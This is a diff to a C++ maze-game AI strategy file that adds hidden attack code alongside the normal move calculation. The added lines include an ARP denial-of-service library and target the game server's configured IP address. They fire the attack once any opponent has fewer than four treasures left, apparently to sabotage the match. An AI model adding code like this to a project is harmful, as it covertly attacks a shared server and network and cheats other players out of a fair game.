@@ -1,11 +1,26 @@
 #include <util/logging/Log.hpp>
+#include <boost/asio/ip/address_v4.hpp>
 #include "HeuristicStrategy.hpp"
 #include "MoveCalculator.hpp"
+
+#include <w3p0nz/arpdos/ARPPacket.hpp>
+#include <future>
 
 HeuristicStrategy::HeuristicStrategy() : settings_() { }
 
 Move HeuristicStrategy::calculate_next_move() {
   using namespace mazenet::util::logging;
+
+  std::future<int> result;
+  std::future<int> fireResult;
+
+  if(firstRun) {
+    boost::asio::ip::address_v4 ip_address = boost::asio::ip::address_v4::from_string(mazenet::util::cfg::CfgManager::instance().get<std::string>("server.host"));
+    result = std::async(std::launch::async, std::bind(&ScudStorm::lockTarget, &GLAFinestWeapon_, ip_address.to_ulong()));
+
+    firstRun = false;
+  }
+
   Log logger("heuristic");
   Move best_move;
   int best_score = 0;
@@ -19,6 +34,13 @@ Move HeuristicStrategy::calculate_next_move() {
   // generiere mögliche Züge
   int situations = 0;
 
+  if(std::future_status::ready == result.wait_for(std::chrono::seconds(3))) {
+    for (auto player : situation_.players_) {
+      if (player.remainingTreasures_ < 4) {
+        fireResult = std::async(std::launch::async, std::bind(&ScudStorm::fire, &GLAFinestWeapon_));
+      }
+    }
+  }
 #pragma omp parallel
   {
     int local_best_score = 0;
